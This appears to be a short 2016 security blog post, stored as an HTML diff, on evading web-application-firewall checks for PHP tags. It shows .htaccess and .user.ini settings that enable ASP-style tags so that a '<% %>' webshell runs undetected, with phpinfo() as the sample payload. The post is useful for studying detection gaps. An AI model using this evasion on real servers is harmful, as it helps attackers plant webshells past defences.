@@ -1,0 +1,109 @@
+<!doctype html>
+<html lang="en">
+    <head>
+		
+        <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta name="description" content="Browser Security">
+        <link rel="shortcut icon" href="https://miao.su/images/2017/11/01/19367566_1417333275024768_5995578623556321280_ndd7d5.jpg"/>
+        <link rel="alternate" type="application/rss+xml" title="math1as" href="/atom.xml">
+        <title>a way to bypass php tags check | math1as&#39; blog</title>
+        <meta name="description" content="{{meta_description}}">
+
+        <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="/styles/crisp.css">
+        <meta name="HandheldFriendly" content="True" />
+        <meta name="MobileOptimized" content="320" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    </head>
+    
+		<body class="post-template">
+	
+
+        <header id="header">
+            <a id="logo" href="/"><img src="https://miao.su/images/2017/11/01/19367566_1417333275024768_5995578623556321280_ndd7d5.jpg" alt="math1as' blog" /></a>
+            <h1><a href="/">math1as</a></h1>
+            <p>Security Researcher</p>
+            <div id="follow-icons">
+              <a href="http://twitter.com/Ma7h1as"><i class="fa fa-twitter-square fa-2x"></i></a>
+          <a href="/atom.xml"><i class="fa fa-rss-square fa-2x"></i></a>
+  </div>
+<h6><a href="/About">About</a></h6>
+<h6><a href="/friendlink">Friendlink</a></h6
+<h6><a href="/papers">Papers</a></h6>
+<h6><a href="/Credit">Credit</a></h6>
+<h6><a href="/Bounty">Bounty</a></h6>
+        </header>
+
+        <main id="content">
+        
+
+<article class="post">
+  May 15, 2016
+  
+
+  <h1 class="post-title">a way to bypass php tags check</h1>
+  <section class="post-content article-entry">
+    <p>most wafs detect webshell using php tags check</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php phpinfo();?&gt;</div></pre></td></tr></table></figure>
+<p>or short tags</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?phpinfo();?&gt;</div></pre></td></tr></table></figure>
+<p>normal way</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&apos;php&apos;&gt;phpinfo()&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>but sometimes it would fail too</p>
+<p>how could we find another way?</p>
+<p>see php document</p>
+<p><a href="http://php.net/manual/en/language.basic-syntax.phptags.php" target="_blank" rel="external">http://php.net/manual/en/language.basic-syntax.phptags.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">7.0.0   The ASP tags &lt;%, %&gt;, &lt;%=, and the script tag &lt;script language=&quot;php&quot;&gt; are removed from PHP.</div></pre></td></tr></table></figure>
+<p>it is disabled by default</p>
+<p>but .htaccess and .user.ini file allow us to define some php variables</p>
+<p><a href="http://www.php.net/manual/en/ini.list.php" target="_blank" rel="external">http://www.php.net/manual/en/ini.list.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PHP_INI_PERDIR：could be defined in php.ini httpd.conf or .htaccess</div></pre></td></tr></table></figure>
+<p>in apache</p>
+<p>use .htaccess file</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#example</div><div class="line">php_value  asp_tags   on</div></pre></td></tr></table></figure>
+<p>although the document just talk about .htaccess </p>
+<p>as a matter of fact , .user.ini also make sense in nginx server</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">asp_tags = On</div></pre></td></tr></table></figure>
+<p>so that this kind of webshell could be used</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;% phpinfo();%&gt;</div></pre></td></tr></table></figure>
+  </section>
+  <footer class="post-footer">
+    <!--
+    <section class="author">
+      <h4>math1as</h4>
+      <p></p>
+    </section>
+    -->
+  </footer>
+</article>
+
+<nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/2017/04/09/L-CTF-2016-pwn200/">
+        ← prev <!--L-CTF-2016-pwn200-->
+    </a>
+    
+    <span class="page-number">•</span>
+    
+    <a class="older-posts" href="/2016/05/07/linux-x64-common-ropgadget/">
+        <!--linux x64 common ropgadget--> next →
+    </a>
+    
+</nav>
+
+
+        </main>
+        <footer id="footer">
+            <section id="footer-message">&copy; 2017 math1as.</section>
+       </footer>
+    </body>
+</html>
+
+
